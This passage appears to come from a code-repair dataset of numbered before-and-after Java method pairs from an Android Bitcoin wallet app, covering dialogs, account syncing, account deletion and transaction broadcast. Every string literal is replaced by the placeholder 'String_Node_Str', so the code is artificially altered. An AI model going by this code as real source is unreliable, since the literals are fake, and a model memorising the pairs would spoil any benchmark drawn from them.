  LayoutInflater inflater=(LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
  final View layout=inflater.inflate(R.layout.optional_message_dialog,null);
  AlertDialog.Builder builder=new AlertDialog.Builder(context).setView(layout);
  final AlertDialog dialog=builder.create();
  TextView tvMessage=layout.findViewById(R.id.tvMessage);
  tvMessage.setText(message);
  CheckBox cb=layout.findViewById(R.id.checkbox);
  cb.setOnCheckedChangeListener(new OnCheckedChangeListener(){
    @Override public void onCheckedChanged(    CompoundButton buttonView,    boolean isChecked){
      context.getSharedPreferences(""String_Node_Str"",Activity.MODE_PRIVATE).edit().putBoolean(optionalMessageId,isChecked).apply();
    }
  }
);
  layout.findViewById(R.id.btOk).setOnClickListener(new OnClickListener(){
    @Override public void onClick(    View v){
      if (onOkay != null) {
        onOkay.run();
      }
      dialog.dismiss();
    }
  }
);
  dialog.show();
  return true;
}"
91104,"/** 
 * Show a dialog with a buttons that displays a message. Click the message or the back button to make it disappear.
 */
public static void showSimpleMessageDialog(final Context context,String message,final Runnable okayRunner,@StringRes int okayButtonText,final Runnable postRunner){
  LayoutInflater inflater=(LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
  final View layout=inflater.inflate(R.layout.simple_message_dialog,null);
  AlertDialog.Builder builder=new AlertDialog.Builder(context).setView(layout);
  final AlertDialog dialog=builder.create();
  TextView tvMessage=((TextView)layout.findViewById(R.id.tvMessage));
  tvMessage.setText(message);
  TextView okButton=(TextView)layout.findViewById(R.id.btOk);
  okButton.setText(okayButtonText);
  okButton.setOnClickListener(new OnClickListener(){
    @Override public void onClick(    View v){
      dialog.dismiss();
      if (okayRunner != null) {
        okayRunner.run();
      }
    }
  }
);
  dialog.setOnDismissListener(new DialogInterface.OnDismissListener(){
    @Override public void onDismiss(    DialogInterface dialog){
      if (postRunner != null) {
        postRunner.run();
      }
    }
  }
);
  dialog.show();
}","/** 
 * Show a dialog with a buttons that displays a message. Click the message or the back button to make it disappear.
 */
public static void showSimpleMessageDialog(final Context context,String message,final Runnable okayRunner,@StringRes int okayButtonText,final Runnable postRunner){
  LayoutInflater inflater=(LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
  final View layout=inflater.inflate(R.layout.simple_message_dialog,null);
  AlertDialog.Builder builder=new AlertDialog.Builder(context).setView(layout);
  final AlertDialog dialog=builder.create();
  TextView tvMessage=layout.findViewById(R.id.tvMessage);
  tvMessage.setText(message);
  TextView okButton=layout.findViewById(R.id.btOk);
  okButton.setText(okayButtonText);
  okButton.setOnClickListener(new OnClickListener(){
    @Override public void onClick(    View v){
      dialog.dismiss();
      if (okayRunner != null) {
        okayRunner.run();
      }
    }
  }
);
  dialog.setOnDismissListener(new DialogInterface.OnDismissListener(){
    @Override public void onDismiss(    DialogInterface dialog){
      if (postRunner != null) {
        postRunner.run();
      }
    }
  }
);
  dialog.show();
}"
91105,"private boolean synchronize(){
  if (_spvBalanceFetcher != null) {
    if (currentAccount instanceof Bip44BCHAccount) {
      _spvBalanceFetcher.requestTransactionsAsync(((Bip44BCHAccount)currentAccount).getAccountIndex());
    }
    if (currentAccount instanceof SingleAddressBCHAccount) {
      _spvBalanceFetcher.requestTransactionsFromSingleAddressAccountAsync(currentAccount.getId().toString());
    }
    for (    WalletAccount account : getAllAccounts()) {
      if (account instanceof Bip44Account) {
      }
 else {
        if (!account.isArchived()) {
          if (!account.synchronize(syncMode)) {
            return false;
          }
        }
      }
    }
  }
 else {
    if (syncMode.onlyActiveAccount) {
      if (currentAccount != null && !currentAccount.isArchived()) {
        return currentAccount.synchronize(syncMode);
      }
    }
 else {
      for (      WalletAccount account : getAllAccounts()) {
        if (!account.isArchived()) {
          if (!account.synchronize(syncMode)) {
            return false;
          }
        }
      }
    }
  }
  return true;
}","private boolean synchronize(){
  if (_spvBalanceFetcher != null) {
    if (currentAccount instanceof Bip44BCHAccount) {
      _spvBalanceFetcher.requestTransactionsAsync(((Bip44BCHAccount)currentAccount).getAccountIndex());
    }
    if (currentAccount instanceof SingleAddressBCHAccount) {
      _spvBalanceFetcher.requestTransactionsFromSingleAddressAccountAsync(currentAccount.getId().toString());
    }
    for (    WalletAccount account : getAllAccounts()) {
      if (account instanceof Bip44Account) {
      }
 else {
        if (!account.isArchived()) {
          if (!account.synchronize(syncMode)) {
            return false;
          }
        }
      }
    }
  }
  if (syncMode.onlyActiveAccount) {
    if (currentAccount != null && !currentAccount.isArchived() && !(currentAccount instanceof Bip44BCHAccount || currentAccount instanceof SingleAddressBCHAccount)) {
      return currentAccount.synchronize(syncMode);
    }
  }
 else {
    for (    WalletAccount account : getAllAccounts()) {
      if (account.isArchived() || account instanceof Bip44BCHAccount || account instanceof SingleAddressBCHAccount) {
        continue;
      }
      if (!account.synchronize(syncMode)) {
        return false;
      }
    }
  }
  return true;
}"
91106,"private SpvBalanceFetcher getSpvBchFetcher(){
  SpvBalanceFetcher result=null;
  if (CommunicationManager.getInstance(_applicationContext).getPairedModules().contains(GooglePlayModuleCollection.INSTANCE.getModules(_applicationContext).get(""String_Node_Str""))) {
    result=new SpvBchFetcher(_applicationContext);
  }
  return result;
}","private SpvBalanceFetcher getSpvBchFetcher(){
  SpvBalanceFetcher result=null;
  if (CommunicationManager.getInstance(_applicationContext).getPairedModules().contains(GooglePlayModuleCollection.getModules(_applicationContext).get(""String_Node_Str""))) {
    result=new SpvBchFetcher(_applicationContext);
  }
  return result;
}"
91107,"public static String formatFiatWithUnit(CurrencyValue fiat){
  return FIAT_FORMAT.format(fiat.getValue()) + ""String_Node_Str"" + fiat.getCurrency();
}","public static String formatFiatWithUnit(CurrencyValue fiat){
  try {
    return FIAT_FORMAT.format(fiat.getValue()) + ""String_Node_Str"" + fiat.getCurrency();
  }
 catch (  Exception e) {
    Log.e(TAG,e.getMessage());
    return ""String_Node_Str"";
  }
}"
91108,"@Override public void onClick(View v){
  _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
    @Override public void run(){
      _mbwManager.setKeyManagementLocked(false);
      update();
      if (isAdded()) {
        getActivity().supportInvalidateOptionsMenu();
      }
    }
  }
);
}","@Override public void onClick(View v){
  _mbwManager.runPinProtectedFunction(AccountsFragment.this.getActivity(),new Runnable(){
    @Override public void run(){
      _mbwManager.setKeyManagementLocked(false);
      update();
      if (isAdded()) {
        getActivity().invalidateOptionsMenu();
      }
    }
  }
);
}"
91109,"@Override public void run(){
  _mbwManager.setKeyManagementLocked(false);
  update();
  if (isAdded()) {
    getActivity().supportInvalidateOptionsMenu();
  }
}","@Override public void run(){
  _mbwManager.setKeyManagementLocked(false);
  update();
  if (isAdded()) {
    getActivity().invalidateOptionsMenu();
  }
}"
91110,"private void lock(){
  _mbwManager.setKeyManagementLocked(true);
  update();
  if (isAdded()) {
    getActivity().supportInvalidateOptionsMenu();
  }
}","private void lock(){
  _mbwManager.setKeyManagementLocked(true);
  update();
  if (isAdded()) {
    getActivity().invalidateOptionsMenu();
  }
}"
91111,"private void deleteAccount(final WalletAccount accountToDelete){
  Preconditions.checkNotNull(accountToDelete);
  final View checkBoxView=View.inflate(getActivity(),R.layout.delkey_checkbox,null);
  final CheckBox keepAddrCheckbox=(CheckBox)checkBoxView.findViewById(R.id.checkbox);
  keepAddrCheckbox.setText(getString(R.string.keep_account_address));
  keepAddrCheckbox.setChecked(false);
  final AlertDialog.Builder deleteDialog=new AlertDialog.Builder(getActivity());
  deleteDialog.setTitle(R.string.delete_account_title);
  final WalletAccount account=_mbwManager.getSelectedAccount();
  final WalletAccount linkedAccount=Utils.getLinkedAccount(account,_mbwManager.getColuManager().getAccounts().values());
  if (account instanceof ColuAccount) {
    deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_rmc_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(((ColuAccount)account).getLinkedAccount().getId())));
  }
 else   if (linkedAccount != null) {
    deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_rmc_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(linkedAccount.getId())));
  }
 else {
    deleteDialog.setMessage(R.string.delete_account_message);
  }
  final boolean hasPrivateData=(accountToDelete instanceof ExportableAccount && ((ExportableAccount)accountToDelete).getExportData(AesKeyCipher.defaultKeyCipher()).privateData.isPresent());
  if (accountToDelete instanceof SingleAddressAccount && hasPrivateData) {
    deleteDialog.setView(checkBoxView);
  }
  if (accountToDelete instanceof ColuAccount && accountToDelete.canSpend()) {
    Log.d(TAG,""String_Node_Str"");
    deleteDialog.setView(checkBoxView);
  }
  deleteDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
      Log.d(TAG,""String_Node_Str"");
      if (hasPrivateData) {
        Long satoshis=getPotentialBalance(accountToDelete);
        AlertDialog.Builder confirmDeleteDialog=new AlertDialog.Builder(getActivity());
        confirmDeleteDialog.setTitle(R.string.confirm_delete_pk_title);
        String label=_mbwManager.getMetadataStorage().getLabelByAccount(accountToDelete.getId());
        int labelCount=1;
        if (account instanceof ColuAccount) {
          label+=""String_Node_Str"" + _mbwManager.getMetadataStorage().getLabelByAccount(((ColuAccount)account).getLinkedAccount().getId());
          labelCount++;
        }
 else         if (linkedAccount != null) {
          label+=""String_Node_Str"" + _mbwManager.getMetadataStorage().getLabelByAccount(linkedAccount.getId());
          labelCount++;
        }
        String message;
        Optional<Address> receivingAddress=accountToDelete.getReceivingAddress();
        if (accountToDelete.isActive() && satoshis != null && satoshis > 0) {
          if (label != null && label.length() != 0) {
            String address;
            if (receivingAddress.isPresent()) {
              address=receivingAddress.get().toMultiLineString();
            }
 else {
              address=""String_Node_Str"";
            }
            message=getString(R.string.confirm_delete_pk_with_balance_with_label,getResources().getQuantityString(R.plurals.account_label,labelCount,label),address,accountToDelete instanceof ColuAccount ? Utils.getColuFormattedValueWithUnit(getPotentialBalanceColu(accountToDelete)) : _mbwManager.getBtcValueString(satoshis));
          }
 else {
            message=getString(R.string.confirm_delete_pk_with_balance,receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"",accountToDelete instanceof ColuAccount ? Utils.getColuFormattedValueWithUnit(getPotentialBalanceColu(accountToDelete)) : _mbwManager.getBtcValueString(satoshis));
          }
        }
 else {
          if (label != null && label.length() != 0) {
            message=getString(R.string.confirm_delete_pk_without_balance_with_label,getResources().getQuantityString(R.plurals.account_label,labelCount,label),receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"");
          }
 else {
            message=getString(R.string.confirm_delete_pk_without_balance,receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"");
          }
        }
        confirmDeleteDialog.setMessage(message);
        confirmDeleteDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface arg0,          int arg1){
            Log.d(TAG,""String_Node_Str"");
            if (keepAddrCheckbox.isChecked() && accountToDelete instanceof SingleAddressAccount) {
              try {
                WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
                if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  coluManager.forgetPrivateKey((ColuAccount)linkedColuAccount);
                }
 else {
                  ((SingleAddressAccount)accountToDelete).forgetPrivateKey(AesKeyCipher.defaultKeyCipher());
                }
                _toaster.toast(R.string.private_key_deleted,false);
              }
 catch (              KeyCipher.InvalidKeyCipher e) {
                throw new RuntimeException(e);
              }
            }
 else {
              if (accountToDelete instanceof ColuAccount) {
                try {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  if (keepAddrCheckbox.isChecked()) {
                    coluManager.forgetPrivateKey((ColuAccount)accountToDelete);
                  }
 else {
                    coluManager.deleteAccount((ColuAccount)accountToDelete);
                    _toaster.toast(""String_Node_Str"",false);
                    _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
                    _mbwManager.getEventBus().post(new ExtraAccountsChanged());
                  }
                }
 catch (                Exception e) {
                  _toaster.toast(getString(R.string.colu_error_deleting),false);
                }
              }
 else {
                WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
                if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  coluManager.deleteAccount((ColuAccount)linkedColuAccount);
                }
 else {
                  try {
                    walletManager.deleteUnrelatedAccount(accountToDelete.getId(),AesKeyCipher.defaultKeyCipher());
                    _storage.deleteAccountMetadata(accountToDelete.getId());
                  }
 catch (                  KeyCipher.InvalidKeyCipher e) {
                    throw new RuntimeException(e);
                  }
                }
                _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
                _toaster.toast(R.string.account_deleted,false);
                _mbwManager.getEventBus().post(new ExtraAccountsChanged());
              }
            }
            finishCurrentActionMode();
            _mbwManager.getEventBus().post(new AccountChanged(accountToDelete.getId()));
          }
        }
);
        confirmDeleteDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface arg0,          int arg1){
          }
        }
);
        confirmDeleteDialog.show();
      }
 else {
        if (accountToDelete instanceof ColuAccount) {
          ColuManager coluManager=_mbwManager.getColuManager();
          coluManager.deleteAccount((ColuAccount)accountToDelete);
        }
 else {
          WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
          if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
            ColuManager coluManager=_mbwManager.getColuManager();
            coluManager.deleteAccount((ColuAccount)linkedColuAccount);
          }
 else {
            try {
              walletManager.deleteUnrelatedAccount(accountToDelete.getId(),AesKeyCipher.defaultKeyCipher());
              _storage.deleteAccountMetadata(accountToDelete.getId());
            }
 catch (            KeyCipher.InvalidKeyCipher e) {
              throw new RuntimeException(e);
            }
          }
        }
        finishCurrentActionMode();
        _mbwManager.getEventBus().post(new AccountChanged(accountToDelete.getId()));
        _mbwManager.getEventBus().post(new ExtraAccountsChanged());
        _toaster.toast(R.string.account_deleted,false);
      }
    }
    private CurrencyValue getPotentialBalanceColu(    WalletAccount account){
      if (account.isArchived()) {
        return null;
      }
 else {
        CurrencyBasedBalance balance=account.getCurrencyBasedBalance();
        ExchangeRateManager exchanger=_mbwManager.getExchangeRateManager();
        return balance.confirmed;
      }
    }
    private Long getPotentialBalance(    WalletAccount account){
      if (account.isArchived()) {
        return null;
      }
 else {
        Balance balance=account.getBalance();
        return balance.confirmed + balance.pendingChange + balance.pendingReceiving;
      }
    }
  }
);
  deleteDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
    }
  }
);
  deleteDialog.show();
}","private void deleteAccount(final WalletAccount accountToDelete){
  Preconditions.checkNotNull(accountToDelete);
  final View checkBoxView=View.inflate(getActivity(),R.layout.delkey_checkbox,null);
  final CheckBox keepAddrCheckbox=(CheckBox)checkBoxView.findViewById(R.id.checkbox);
  keepAddrCheckbox.setText(getString(R.string.keep_account_address));
  keepAddrCheckbox.setChecked(false);
  final AlertDialog.Builder deleteDialog=new AlertDialog.Builder(getActivity());
  deleteDialog.setTitle(R.string.delete_account_title);
  final WalletAccount account=_mbwManager.getSelectedAccount();
  final WalletAccount linkedAccount=Utils.getLinkedAccount(account,_mbwManager.getColuManager().getAccounts().values());
  if (account instanceof ColuAccount) {
    deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_rmc_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(((ColuAccount)account).getLinkedAccount().getId())));
  }
 else   if (linkedAccount != null) {
    deleteDialog.setMessage(getString(R.string.delete_account_message) + ""String_Node_Str"" + getString(R.string.both_rmc_will_deleted,_mbwManager.getMetadataStorage().getLabelByAccount(account.getId()),_mbwManager.getMetadataStorage().getLabelByAccount(linkedAccount.getId())));
  }
 else {
    deleteDialog.setMessage(R.string.delete_account_message);
  }
  final boolean hasPrivateData=(accountToDelete instanceof ExportableAccount && ((ExportableAccount)accountToDelete).getExportData(AesKeyCipher.defaultKeyCipher()).privateData.isPresent());
  if (accountToDelete instanceof SingleAddressAccount && hasPrivateData) {
    deleteDialog.setView(checkBoxView);
  }
  if (accountToDelete instanceof ColuAccount && accountToDelete.canSpend()) {
    Log.d(TAG,""String_Node_Str"");
    deleteDialog.setView(checkBoxView);
  }
  deleteDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
      Log.d(TAG,""String_Node_Str"");
      if (hasPrivateData) {
        Long satoshis=getPotentialBalance(accountToDelete);
        AlertDialog.Builder confirmDeleteDialog=new AlertDialog.Builder(getActivity());
        confirmDeleteDialog.setTitle(R.string.confirm_delete_pk_title);
        String label=_mbwManager.getMetadataStorage().getLabelByAccount(accountToDelete.getId());
        int labelCount=1;
        if (account instanceof ColuAccount) {
          label+=""String_Node_Str"" + _mbwManager.getMetadataStorage().getLabelByAccount(((ColuAccount)account).getLinkedAccount().getId());
          labelCount++;
        }
 else         if (linkedAccount != null) {
          label+=""String_Node_Str"" + _mbwManager.getMetadataStorage().getLabelByAccount(linkedAccount.getId());
          labelCount++;
        }
        String message;
        Optional<Address> receivingAddress=accountToDelete.getReceivingAddress();
        if (accountToDelete.isActive() && satoshis != null && satoshis > 0) {
          if (label != null && label.length() != 0) {
            String address;
            if (receivingAddress.isPresent()) {
              address=receivingAddress.get().toMultiLineString();
            }
 else {
              address=""String_Node_Str"";
            }
            message=getString(R.string.confirm_delete_pk_with_balance_with_label,getResources().getQuantityString(R.plurals.account_label,labelCount,label),address,accountToDelete instanceof ColuAccount ? Utils.getColuFormattedValueWithUnit(getPotentialBalanceColu(accountToDelete)) : _mbwManager.getBtcValueString(satoshis));
          }
 else {
            message=getString(R.string.confirm_delete_pk_with_balance,receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"",accountToDelete instanceof ColuAccount ? Utils.getColuFormattedValueWithUnit(getPotentialBalanceColu(accountToDelete)) : _mbwManager.getBtcValueString(satoshis));
          }
        }
 else {
          if (label != null && label.length() != 0) {
            message=getString(R.string.confirm_delete_pk_without_balance_with_label,getResources().getQuantityString(R.plurals.account_label,labelCount,label),receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"");
          }
 else {
            message=getString(R.string.confirm_delete_pk_without_balance,receivingAddress.isPresent() ? receivingAddress.get().toMultiLineString() : ""String_Node_Str"");
          }
        }
        confirmDeleteDialog.setMessage(message);
        confirmDeleteDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface arg0,          int arg1){
            Log.d(TAG,""String_Node_Str"");
            if (keepAddrCheckbox.isChecked() && accountToDelete instanceof SingleAddressAccount) {
              try {
                WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
                if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  coluManager.forgetPrivateKey((ColuAccount)linkedColuAccount);
                }
 else {
                  ((SingleAddressAccount)accountToDelete).forgetPrivateKey(AesKeyCipher.defaultKeyCipher());
                }
                _toaster.toast(R.string.private_key_deleted,false);
              }
 catch (              KeyCipher.InvalidKeyCipher e) {
                throw new RuntimeException(e);
              }
            }
 else {
              if (accountToDelete instanceof ColuAccount) {
                try {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  if (keepAddrCheckbox.isChecked()) {
                    coluManager.forgetPrivateKey((ColuAccount)accountToDelete);
                  }
 else {
                    coluManager.deleteAccount((ColuAccount)accountToDelete);
                    _toaster.toast(""String_Node_Str"",false);
                    _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
                    _mbwManager.getEventBus().post(new ExtraAccountsChanged());
                  }
                }
 catch (                Exception e) {
                  _toaster.toast(getString(R.string.colu_error_deleting),false);
                }
              }
 else {
                WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
                if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
                  ColuManager coluManager=_mbwManager.getColuManager();
                  coluManager.deleteAccount((ColuAccount)linkedColuAccount);
                }
 else {
                  try {
                    walletManager.deleteUnrelatedAccount(accountToDelete.getId(),AesKeyCipher.defaultKeyCipher());
                    _storage.deleteAccountMetadata(accountToDelete.getId());
                  }
 catch (                  KeyCipher.InvalidKeyCipher e) {
                    throw new RuntimeException(e);
                  }
                }
                _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
                _toaster.toast(R.string.account_deleted,false);
                _mbwManager.getEventBus().post(new ExtraAccountsChanged());
              }
            }
            finishCurrentActionMode();
            _mbwManager.getEventBus().post(new AccountChanged(accountToDelete.getId()));
          }
        }
);
        confirmDeleteDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface arg0,          int arg1){
          }
        }
);
        confirmDeleteDialog.show();
      }
 else {
        if (accountToDelete instanceof ColuAccount) {
          ColuManager coluManager=_mbwManager.getColuManager();
          coluManager.deleteAccount((ColuAccount)accountToDelete);
        }
 else {
          WalletAccount linkedColuAccount=Utils.getLinkedAccount(accountToDelete,_mbwManager.getColuManager().getAccounts().values());
          if (linkedColuAccount != null && linkedColuAccount instanceof ColuAccount) {
            ColuManager coluManager=_mbwManager.getColuManager();
            coluManager.deleteAccount((ColuAccount)linkedColuAccount);
          }
 else {
            try {
              walletManager.deleteUnrelatedAccount(accountToDelete.getId(),AesKeyCipher.defaultKeyCipher());
              _storage.deleteAccountMetadata(accountToDelete.getId());
            }
 catch (            KeyCipher.InvalidKeyCipher e) {
              throw new RuntimeException(e);
            }
          }
        }
        finishCurrentActionMode();
        _mbwManager.getEventBus().post(new AccountChanged(accountToDelete.getId()));
        _mbwManager.getEventBus().post(new ExtraAccountsChanged());
        _toaster.toast(R.string.account_deleted,false);
      }
    }
    private CurrencyValue getPotentialBalanceColu(    WalletAccount account){
      if (account.isArchived()) {
        return null;
      }
 else {
        CurrencyBasedBalance balance=account.getCurrencyBasedBalance();
        return balance.confirmed;
      }
    }
    private Long getPotentialBalance(    WalletAccount account){
      if (account.isArchived()) {
        return null;
      }
 else {
        Balance balance=account.getBalance();
        return balance.confirmed + balance.pendingChange + balance.pendingReceiving;
      }
    }
  }
);
  deleteDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
    }
  }
);
  deleteDialog.show();
}"
91112,"private CurrencyValue getPotentialBalanceColu(WalletAccount account){
  if (account.isArchived()) {
    return null;
  }
 else {
    CurrencyBasedBalance balance=account.getCurrencyBasedBalance();
    ExchangeRateManager exchanger=_mbwManager.getExchangeRateManager();
    return balance.confirmed;
  }
}","private CurrencyValue getPotentialBalanceColu(WalletAccount account){
  if (account.isArchived()) {
    return null;
  }
 else {
    CurrencyBasedBalance balance=account.getCurrencyBasedBalance();
    return balance.confirmed;
  }
}"
91113,"/** 
 * Called when the activity is first created.
 */
@SuppressWarnings(""String_Node_Str"") @Override public View onCreateView(LayoutInflater inflater,ViewGroup container,Bundle savedInstanceState){
  return inflater.inflate(R.layout.records_activity,container,false);
}","/** 
 * Called when the activity is first created.
 */
@SuppressWarnings(""String_Node_Str"") @Override public View onCreateView(@NonNull LayoutInflater inflater,ViewGroup container,Bundle savedInstanceState){
  return inflater.inflate(R.layout.records_activity,container,false);
}"
91114,"@Override public void onViewCreated(View view,@Nullable Bundle savedInstanceState){
  super.onViewCreated(view,savedInstanceState);
  rvRecords=(RecyclerView)view.findViewById(R.id.rvRecords);
  rvRecords.setLayoutManager(new LinearLayoutManager(getActivity(),LinearLayoutManager.VERTICAL,false));
  accountListAdapter=new AccountListAdapter(getActivity(),_mbwManager);
  rvRecords.setAdapter(accountListAdapter);
  rvRecords.addItemDecoration(new DividerItemDecoration(getResources().getDrawable(R.drawable.divider_account_list)));
  rvRecords.setHasFixedSize(true);
  llLocked=view.findViewById(R.id.llLocked);
  accountListAdapter.setItemClickListener(recordAddressClickListener);
  accountListAdapter.setItemSelectListener(recordStarClickListener);
}","@Override public void onViewCreated(@NonNull View view,@Nullable Bundle savedInstanceState){
  super.onViewCreated(view,savedInstanceState);
  rvRecords=(RecyclerView)view.findViewById(R.id.rvRecords);
  rvRecords.setLayoutManager(new LinearLayoutManager(getActivity(),LinearLayoutManager.VERTICAL,false));
  accountListAdapter=new AccountListAdapter(getActivity(),_mbwManager);
  rvRecords.setAdapter(accountListAdapter);
  rvRecords.addItemDecoration(new DividerItemDecoration(getResources().getDrawable(R.drawable.divider_account_list)));
  rvRecords.setHasFixedSize(true);
  llLocked=view.findViewById(R.id.llLocked);
  accountListAdapter.setItemClickListener(recordAddressClickListener);
  accountListAdapter.setItemSelectListener(recordStarClickListener);
}"
91115,"public void updateData(){
  itemList.clear();
  WalletManager walletManager=mbwManager.getWalletManager(false);
  MetadataStorage storage=mbwManager.getMetadataStorage();
  List<WalletAccount> bitcoinHdAccounts=new ArrayList<>(AccountManager.INSTANCE.getBTCBip44Accounts().values());
  itemList.addAll(buildGroup(bitcoinHdAccounts,storage,context.getString(R.string.active_hd_accounts_name),GROUP_TITLE_TYPE));
  List<WalletAccount> bitcoinSAAccounts=new ArrayList<>(AccountManager.INSTANCE.getBTCSingleAddressAccounts().values());
  itemList.addAll(buildGroup(bitcoinSAAccounts,storage,""String_Node_Str"",GROUP_TITLE_TYPE));
  List<WalletAccount> bitcoinCashHDAccounts=new ArrayList<>(AccountManager.INSTANCE.getBCHBip44Accounts().values());
  itemList.addAll(buildGroup(bitcoinCashHDAccounts,storage,context.getString(R.string.bitcoin_cash_hd),GROUP_TITLE_TYPE));
  List<WalletAccount> bitcoinCashSAAccounts=new ArrayList<>(AccountManager.INSTANCE.getBCHSingleAddressAccounts().values());
  itemList.addAll(buildGroup(bitcoinCashSAAccounts,storage,context.getString(R.string.bitcoin_cash_sa),GROUP_TITLE_TYPE));
  List<WalletAccount> coluAccounts=new ArrayList<>();
  for (  WalletAccount walletAccount : AccountManager.INSTANCE.getColuAccounts().values()) {
    coluAccounts.add(walletAccount);
    coluAccounts.add(((ColuAccount)walletAccount).getLinkedAccount());
  }
  itemList.addAll(buildGroup(coluAccounts,storage,context.getString(R.string.digital_assets),GROUP_TITLE_TYPE));
  List<WalletAccount> accounts=walletManager.getActiveOtherAccounts();
  List<WalletAccount> other=new ArrayList<>();
  for (  WalletAccount account : accounts) {
switch (account.getType()) {
case BTCSINGLEADDRESS:
case BTCBIP44:
case BCHSINGLEADDRESS:
case BCHBIP44:
case COLU:
      break;
default :
    other.add(account);
  break;
}
}
itemList.addAll(buildGroup(other,storage,context.getString(R.string.active_other_accounts_name),GROUP_TITLE_TYPE));
itemList.add(new Item(TOTAL_BALANCE_TYPE,""String_Node_Str"",walletManager.getActiveAccounts()));
itemList.addAll(buildGroup(walletManager.getArchivedAccounts(),storage,context.getString(R.string.archive_name),GROUP_ARCHIVED_TITLE_TYPE));
notifyDataSetChanged();
}","public void updateData(){
  itemList.clear();
  WalletManager walletManager=mbwManager.getWalletManager(false);
  MetadataStorage storage=mbwManager.getMetadataStorage();
  AccountManager am=AccountManager.INSTANCE;
  addGroup(R.string.active_hd_accounts_name,GROUP_TITLE_TYPE,am.getBTCBip44Accounts().values());
  addGroup(""String_Node_Str"",GROUP_TITLE_TYPE,am.getBTCSingleAddressAccounts().values());
  addGroup(R.string.bitcoin_cash_hd,GROUP_TITLE_TYPE,am.getBCHBip44Accounts().values());
  addGroup(R.string.bitcoin_cash_sa,GROUP_TITLE_TYPE,am.getBCHSingleAddressAccounts().values());
  List<WalletAccount> coluAccounts=new ArrayList<>();
  for (  WalletAccount walletAccount : AccountManager.INSTANCE.getColuAccounts().values()) {
    coluAccounts.add(walletAccount);
    coluAccounts.add(((ColuAccount)walletAccount).getLinkedAccount());
  }
  addGroup(R.string.digital_assets,GROUP_TITLE_TYPE,coluAccounts);
  List<WalletAccount> accounts=walletManager.getActiveOtherAccounts();
  List<WalletAccount> other=new ArrayList<>();
  for (  WalletAccount account : accounts) {
switch (account.getType()) {
case BTCSINGLEADDRESS:
case BTCBIP44:
case BCHSINGLEADDRESS:
case BCHBIP44:
case COLU:
      break;
default :
    other.add(account);
  break;
}
}
addGroup(R.string.active_other_accounts_name,GROUP_TITLE_TYPE,other);
itemList.add(new Item(TOTAL_BALANCE_TYPE,""String_Node_Str"",walletManager.getActiveAccounts()));
addGroup(R.string.archive_name,GROUP_ARCHIVED_TITLE_TYPE,walletManager.getArchivedAccounts());
notifyDataSetChanged();
}"
91116,"@Override protected WalletAccount.BroadcastResult doInBackground(Void... args){
  if (CommunicationManager.getInstance(getApplicationContext()).getPairedModules().contains(GooglePlayModuleCollection.INSTANCE.getModules(getApplicationContext()).get(""String_Node_Str""))) {
    Intent intent=IntentContract.BroadcastTransaction.createIntent(_transaction.toBytes());
    WalletApplication.sendToSpv(intent,_mbwManager.getSelectedAccount().getType());
    return WalletAccount.BroadcastResult.SUCCESS;
  }
  return _account.broadcastTransaction(_transaction);
}","@Override protected WalletAccount.BroadcastResult doInBackground(Void... args){
